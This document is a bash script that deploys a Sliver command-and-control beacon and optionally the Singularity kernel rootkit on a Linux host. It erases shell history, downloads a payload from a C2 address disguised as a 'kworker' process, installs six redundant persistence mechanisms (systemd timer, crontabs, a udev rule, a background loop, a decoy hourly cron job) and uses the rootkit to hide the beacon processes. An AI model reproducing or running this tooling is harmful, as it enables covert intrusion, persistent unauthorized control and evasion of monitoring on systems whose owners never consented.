#!/bin/bash

# ==============================================================================
# Singularity + Sliver 5-Minute Redundant Hyper-Stealth Deployment
# ==============================================================================

# 1. Environmental Stealth
unset HISTFILE
export HISTSIZE=0
rm -f /root/.bash_history
history -c

if [ "$EUID" -ne 0 ]; then
  echo "[-] Please run as root."
  exit 1
fi

C2_IP="10.2.0.117"

USE_SINGULARITY=false
if [ "$1" = "-s" ]; then
    USE_SINGULARITY=true
fi

echo "[*] Disabling bash history..."

# 2. OS Detection and Dependencies
echo "[*] Detecting OS and installing kernel headers..."
if [ -f /etc/os-release ]; then
    . /etc/os-release
    case $ID in
        ubuntu|debian|kali)
            export DEBIAN_FRONTEND=noninteractive
            apt-get update -qq
            if [ "$USE_SINGULARITY" = true ]; then
                apt-get install -y -qq build-essential linux-headers-$(uname -r) curl wget git
            else
                apt-get install -y -qq curl wget
            fi
            ;;
        fedora|centos|rhel)
            if [ "$USE_SINGULARITY" = true ]; then
                dnf install -y -q gcc make kernel-devel-$(uname -r) curl wget git
            else
                dnf install -y -q curl wget
            fi
            ;;
        *)
            echo "[-] Unsupported OS: $ID"
            echo "[-] Attempting to proceed without auto-dependencies..."
            ;;
    esac
else
    echo "[-] Cannot detect OS via /etc/os-release."
fi

# 3. Clone Singularity Rootkit from GitHub (Only if -s is passed)
if [ "$USE_SINGULARITY" = true ]; then
    echo "[*] Staging Singularity Rootkit..."
    cd /dev/shm
    if [ ! -d "Singularity" ]; then
        git clone -q https://github.com/KriyosArcane/Singularity.git
        if [ ! -d "Singularity" ]; then
            echo "[-] Failed to clone Singularity from GitHub. Proceeding anyway..."
        fi
    fi

    if [ -d "Singularity" ]; then
        cd Singularity
        echo "[*] Compiling Rootkit against $(uname -r) headers..."
        make clean >/dev/null 2>&1
        make >/dev/null 2>&1
        echo "[*] Loading Singularity Module..."
        insmod singularity.ko || echo "[-] Failed to insmod singularity.ko. Are headers missing?"
        cd /dev/shm
    fi
fi

# 4. Beacon Staging
echo "[*] Staging Beacons..."
cd /dev/shm
wget -q "http://$C2_IP/kworker_sys" || curl -s "http://$C2_IP/kworker_sys" -o kworker_sys
chmod +x kworker_sys

echo "[*] Duplicating beacon payloads for redundancy..."
for i in {1..5}; do
    cp kworker_sys kworker_sys_$i
done
cp kworker_sys kworker_sys_decoy

# 5. Hyper-Redundant Persistence (5-min intervals)

# Beacon 1: systemd timer
echo "[*] Setting up Persistence 1 (systemd timer)..."
cat <<EOF > /lib/systemd/system/kworker_sys.service
[Unit]
Description=Kernel Worker System Process
After=network.target

[Service]
Type=simple
ExecStart=/dev/shm/kworker_sys_1
Restart=on-failure
RestartSec=5
EOF

cat <<EOF > /lib/systemd/system/kworker_sys.timer
[Unit]
Description=Kernel Worker System Timer

[Timer]
OnCalendar=*:0/5
Persistent=true

[Install]
WantedBy=timers.target
EOF

systemctl daemon-reload >/dev/null 2>&1
systemctl enable --now kworker_sys.timer >/dev/null 2>&1

# Beacon 2: crontab (root)
echo "[*] Setting up Persistence 2 (crontab)..."
(crontab -l 2>/dev/null | grep -v "kworker_sys_2"; echo "*/5 * * * * /dev/shm/kworker_sys_2 >/dev/null 2>&1") | crontab -

# Beacon 3: /etc/cron.d/
echo "[*] Setting up Persistence 3 (cron.d)..."
echo "*/5 * * * * root /dev/shm/kworker_sys_3 >/dev/null 2>&1" > /etc/cron.d/kworker_sys
chmod 644 /etc/cron.d/kworker_sys

# Beacon 4: udev rule (network up)
echo "[*] Setting up Persistence 4 (udev)..."
echo 'SUBSYSTEM=="net", ACTION=="add", RUN+="/dev/shm/kworker_sys_4"' > /etc/udev/rules.d/99-kworker.rules
udevadm control --reload-rules >/dev/null 2>&1

# Beacon 5: Infinite while loop background process
echo "[*] Setting up Persistence 5 (while loop)..."
nohup sh -c 'while true; do /dev/shm/kworker_sys_5 >/dev/null 2>&1; sleep 300; done' >/dev/null 2>&1 &

# Beacon 6 (Decoy): cron.hourly
echo "[*] Setting up Persistence 6 (decoy cron.hourly)..."
cat <<EOF > /etc/cron.hourly/kworker_sys_decoy
#!/bin/bash
/dev/shm/kworker_sys_decoy >/dev/null 2>&1
EOF
chmod +x /etc/cron.hourly/kworker_sys_decoy

# 6. Initial Execution & Hiding
echo "[*] Executing Beacons and engaging Singularity stealth..."

# Run systemd explicitly for immediate start
systemctl start kworker_sys.service >/dev/null 2>&1

# Execute the other beacons to get them running now
/dev/shm/kworker_sys_2 >/dev/null 2>&1 &
/dev/shm/kworker_sys_3 >/dev/null 2>&1 &
/dev/shm/kworker_sys_4 >/dev/null 2>&1 &
# kworker_sys_5 is already started via the while loop above.
/dev/shm/kworker_sys_decoy >/dev/null 2>&1 &

sleep 3

if [ "$USE_SINGULARITY" = true ]; then
    # Find the PIDs of beacons 1-5 and hide them using Singularity
    echo "[*] Initiating rootkit vanish protocol..."
    for i in {1..5}; do
        PIDS=$(pidof kworker_sys_$i)
        if [ ! -z "$PIDS" ]; then
            for p in $PIDS; do
                echo "    -> Vanishing kworker_sys_$i (PID: $p) from kernel vision..."
                kill -59 $p
            done
        fi
    done
    # We explicitly do NOT hide kworker_sys_decoy.
    echo "[*] Decoy kworker_sys_decoy (Beacon 6) explicitly left visible for distraction."
else
    echo "[*] Skipping Singularity kernel-level stealth. All payloads remain visible to monitoring tools."
fi

echo "[+] Deployment complete."
